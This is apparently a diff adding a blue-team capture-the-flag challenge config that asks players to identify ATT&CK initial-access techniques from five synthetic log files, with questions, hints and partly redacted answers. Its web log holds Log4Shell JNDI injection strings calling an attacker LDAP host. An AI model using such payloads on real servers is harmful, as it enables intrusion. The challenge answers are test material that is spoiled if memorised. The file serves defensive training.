@@ -1,0 +1,130 @@
+# ATT&CK TA0001 — Initial Access mini-campaign.
+#
+# Five distinct ways the attacker landed in five different
+# environments. Hunter walks five log files, one per environment,
+# and identifies the initial-access technique for each.
+
+slug: tier-2-initial-access
+title: "Tier 2: Initial Access"
+description: |
+  Five separate environments — corporate Office 365, a public web
+  server, an SSO portal, a VPN gateway, and a software supply
+  chain — each had one suspicious event in the last week. For
+  each environment, identify which ATT&CK technique was used for
+  initial access.
+category: Threat Hunting
+team: blue
+difficulty: 3
+points: 400
+flag: "CTF{REDACTED}"
+tactic_id: TA0001
+docker_port: 2222
+profile: default-strict
+
+techniques:
+  - id: T1566.001
+    description: |
+      Spearphishing Attachment — user opens malicious xlsm that
+      spawns macro-driven powershell from Office.
+    question:
+      prompt: |
+        In office365_audit.log, which user opened the malicious
+        attachment that triggered the macro chain? (Just the
+        UPN, e.g. user@corp.local.)
+      hint: |
+        Filter for MailItemsAccessed + WordOrExcelMacroEnabled.
+      answer: REDACTED
+
+  - id: T1190
+    description: |
+      Exploit Public-Facing Application — Log4Shell probe followed
+      by reverse-shell pull from the JNDI server.
+    question:
+      prompt: |
+        In webapp_access.log, which CVE was used to compromise
+        the public web server? (Format: CVE-YYYY-NNNNN.)
+      hint: |
+        Look for an LDAP-protocol JNDI string in a User-Agent or
+        header.
+      answer: REDACTED
+
+  - id: T1078
+    description: |
+      Valid Accounts — credential-stuffing into an SSO portal
+      using a credential found in a recent dump.
+    question:
+      prompt: |
+        In sso_auth.log, what country code does the successful
+        login come from that should have triggered an impossible-
+        travel alert? (Two-letter ISO code, uppercase.)
+      hint: |
+        Compare the successful logon with the user's other
+        recent successful logons in the same file.
+      answer: RU
+
+  - id: T1133
+    description: |
+      External Remote Services — VPN logon from an IP previously
+      seen scanning multiple ports on the same gateway.
+    question:
+      prompt: |
+        In vpn_gateway.log, what is the attacker source IP that
+        successfully authenticated to the VPN after a port-scan
+        burst? (Format: x.x.x.x.)
+      hint: |
+        The scan source and the successful logon share an IP.
+        Look for repeated TCP RST on closed ports preceding the
+        accepted login.
+      answer: REDACTED
+
+  - id: T1195.002
+    description: |
+      Supply Chain Compromise — a trusted update server pushed a
+      backdoored package signed with a stolen cert.
+    question:
+      prompt: |
+        In supply_chain.log, what is the SHA256 of the package
+        that was distributed by the compromised update server?
+        (Full hex string, lowercase.)
+      hint: |
+        The compromised update server is the *only* upstream that
+        flipped its signing identity between consecutive
+        publishes.
+      answer: REDACTED
+
+logs:
+  office365_audit.log: |
+    2026-05-10T08:12:01Z user=REDACTED op=Send subject="Q2 board pack" status=ok
+    2026-05-10T13:42:18Z user=marcus.bell@corp.local op=MailItemsAccessed item="vendor-invoice.xlsx" macro=false status=ok
+    2026-05-11T09:14:33Z user=REDACTED op=MailItemsAccessed item="VAT-receipt-2026Q2.xlsm" macro=true macroAction=WordOrExcelMacroEnabled childProcess="powershell.exe -enc JAB..." status=ok
+    2026-05-11T09:14:55Z user=REDACTED op=ChildProcess image="powershell.exe" parent="EXCEL.EXE" status=ok
+    2026-05-11T11:02:11Z user=carla.reyes@corp.local op=Send subject="Status update" status=ok
+  webapp_access.log: |
+    192.0.2.14 - - [11/May/2026:09:42:01 +0000] "GET / HTTP/1.1" 200 1832 "-" "Mozilla/5.0"
+    203.0.113.72 - - [11/May/2026:10:11:18 +0000] "GET /api/health HTTP/1.1" 200 24 "-" "${jndi:ldap://203.0.113.72:1389/exploit}"
+    203.0.113.72 - - [11/May/2026:10:11:19 +0000] "GET /api/users HTTP/1.1" 500 142 "-" "x-api-key: ${jndi:ldap://203.0.113.72:1389/k}"
+    203.0.113.72 - - [11/May/2026:10:12:02 +0000] "GET /admin/ HTTP/1.1" 401 92 "-" "Mozilla/5.0"
+    192.0.2.14 - - [11/May/2026:10:42:18 +0000] "POST /api/users HTTP/1.1" 201 84 "-" "Mozilla/5.0"
+    INTERNAL NOTE: vendor advisory REDACTED affects the bundled log4j 2.14 in webapp v3.2. Patch deferred until next sprint.
+  sso_auth.log: |
+    2026-05-08T07:11:09Z user=REDACTED@corp.local result=success ip=203.0.113.40 geo=US ua="Chrome/124 macOS"
+    2026-05-08T18:22:51Z user=REDACTED@corp.local result=success ip=203.0.113.40 geo=US ua="Chrome/124 macOS"
+    2026-05-09T08:02:14Z user=REDACTED@corp.local result=success ip=203.0.113.40 geo=US ua="Chrome/124 macOS"
+    2026-05-09T17:51:33Z user=REDACTED@corp.local result=success ip=203.0.113.40 geo=US ua="Chrome/124 macOS"
+    2026-05-10T03:18:42Z user=REDACTED@corp.local result=success ip=185.220.101.55 geo=RU ua="curl/8.4"
+    2026-05-10T08:04:11Z user=REDACTED@corp.local result=success ip=203.0.113.40 geo=US ua="Chrome/124 macOS"
+  vpn_gateway.log: |
+    2026-05-09T03:42:11Z src=REDACTED dst=vpn.corp.local:443 action=RST reason=closed_port
+    2026-05-09T03:42:12Z src=REDACTED dst=vpn.corp.local:22 action=RST reason=closed_port
+    2026-05-09T03:42:13Z src=REDACTED dst=vpn.corp.local:80 action=RST reason=closed_port
+    2026-05-09T03:42:15Z src=REDACTED dst=vpn.corp.local:8443 action=RST reason=closed_port
+    2026-05-09T03:42:18Z src=REDACTED dst=vpn.corp.local:1194 action=ALLOW
+    2026-05-09T03:42:20Z src=REDACTED user=svc_legacy result=auth_success mfa=disabled
+    2026-05-09T04:18:55Z src=REDACTED user=svc_legacy result=tunnel_established assigned_ip=10.50.0.42
+    2026-05-09T11:02:14Z src=192.0.2.18 user=engineering result=auth_success mfa=ok
+  supply_chain.log: |
+    2026-05-05T02:00:00Z update_server=updates.corp.local package=corp-helper-cli version=1.18.2 sha256=4b9d8e2f1a3c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e signer="Corp Helper Authority"
+    2026-05-06T02:00:00Z update_server=updates.corp.local package=corp-helper-cli version=1.18.3 sha256=2c8d7e1f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d signer="Corp Helper Authority"
+    2026-05-07T02:00:00Z update_server=updates.corp.local package=corp-helper-cli version=1.18.4 sha256=5e9d8c7f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d signer="Corp Helper Authority"
+    2026-05-08T02:00:00Z update_server=updates.corp.local package=corp-helper-cli version=1.18.5 sha256=REDACTED signer="Corp Helper Stage1 (revoked 2026-05-09)"
+    2026-05-09T02:00:00Z update_server=updates.corp.local package=corp-helper-cli version=1.18.6 sha256=1f0e9d8c7b6a5d4e3f2a1b0c9d8e7f6a5d4c3b2a1e0f9d8c7b6a5d4e3f2a1b0c signer="Corp Helper Authority"
